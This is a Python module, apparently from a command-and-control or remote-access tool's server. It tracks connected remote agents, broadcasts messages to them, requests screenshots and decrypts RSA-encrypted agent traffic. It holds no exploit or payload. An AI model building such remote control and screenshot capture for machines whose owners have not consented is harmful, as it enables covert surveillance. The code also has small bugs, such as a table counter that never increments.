import typing
from agent import Agent
from socket import socket
import base64
from logger import get_logger
from Crypto.Cipher import PKCS1_OAEP
import msgpack
from typing import cast

from globals import AGENTS_JSON, ENCODING, RECV_SIZE, TLS_ENABLED

logger = get_logger()


class AgentTool:
    """A class for agent utilties"""

    def __init__(self, agents: list[Agent] = []) -> None:
        self.agents = agents

    def add_agent(self, agent: Agent) -> None:
        """Add agent to agents dictionary object"""
        self.agents.append(agent)

    def del_agent(self, agent: Agent) -> None:
        """Remove agent from agents dictionary object"""
        self.agents.remove(agent)

    def get_agents(self) -> list[Agent]:
        """Remove agent object from agetns dictionary object"""
        return self.agents

    def get_agent_by_rhost(self, rhost: str) -> Agent | None:
        """Get agent by remote addr"""
        for agent in self.agents:
            if agent.addr == rhost:
                return agent

    def get_agent_by_index(self, index: int) -> Agent:
        """Return an agent with given index number"""
        return self.agents[index]

    def print_agents_table(self):
        """
        Agents table
        """
        i = 0
        for agent in self.agents:
            print(f"{i} | {agent.addr}")

    def broadcast_msg(self, data: bytes) -> None:
        """
        Send message to all agents
        """
        for agent in self.agents:
            agent.socket.sendall(data)
            logger.debug(f"Broadcast message sent to {agent.addr}")

    def send_str(self, agent: Agent, msg: str) -> None:
        """Send message to an agent"""
        socket = agent.socket
        socket.sendall(msg.encode())

    def send_str_by_rhost(self, rhost: str, msg: str) -> None:
        """Send message to an agent by remote addr"""
        socket = self.get_agent_by_rhost(rhost)
        if socket is None:
            logger.info(f"No agents found with remote address {rhost}")
            return
        else:
            self.send_str(socket, msg)

    def send_bytes(self, agent: Agent, data: bytes) -> None:
        socket = agent.socket
        socket.sendall(data)

    def request_screenshoot(self, agent: Agent) -> None:
        request = {"type": "screenshoot"}
        msg: bytes = cast(bytes, msgpack.dumps(request))
        self.send_bytes(agent=agent, data=msg)

    def add_role_to_agent(self, role: str, agent: Agent) -> list[str]:
        if role not in agent.roles:
            agent.roles.append(role)
        else:
            logger.info(f"{role} is already assigned to {agent.addr}")
        return agent.roles

    # connection handler
    def handle_client(
        self,
        client_socket: socket,
        addr,
        rsa_chipher: PKCS1_OAEP.PKCS1OAEP_Cipher | None,
        encoding: str = ENCODING,
        recv_size: int = RECV_SIZE,
        tls_enabled: bool | str = TLS_ENABLED,
        agents_json: str = AGENTS_JSON,
        logger=get_logger(),
    ) -> None:
        logger.info(f"\nConnection from {addr}")
        agent = Agent(str(addr), ["agent"], agents_json, socket=client_socket)

        # Add agent to the agents dictionary
        self.add_agent(agent)

        try:
            while True:
                message: str = "None"
                data = client_socket.recv(recv_size)
                if not data:
                    break
                logger.debug(f"DATA SIZE = {len(data)}")
                if tls_enabled and tls_enabled != "False" and rsa_chipher is not None:
                    try:
                        decrypted = rsa_chipher.decrypt(base64.b64decode(data))
                        logger.debug(f"decrypted={decrypted}")
                        deserialized_data: list = cast(list, msgpack.loads(decrypted))
                        logger.debug(f"deserialized_data={deserialized_data}")
                        message_dict: dict = deserialized_data[0]
                        message: str = message_dict["content"]
                    except Exception as e:
                        logger.error(f"RSA decrypt error: {e}")
                else:
                    deserialized_data: list = cast(list, msgpack.loads(data))
                    message_dict: dict = deserialized_data[0]
                    message: str = message_dict["content"]
                logger.info(f"Received from {addr}: {message}\n")
        except Exception as e:
            logger.error(f"Error with client {addr}: {e}")
        finally:
            # Remove agent from dictionary when connection closes
            self.del_agent(agent)
            client_socket.close()
            logger.info(f"Connection with {addr} closed")
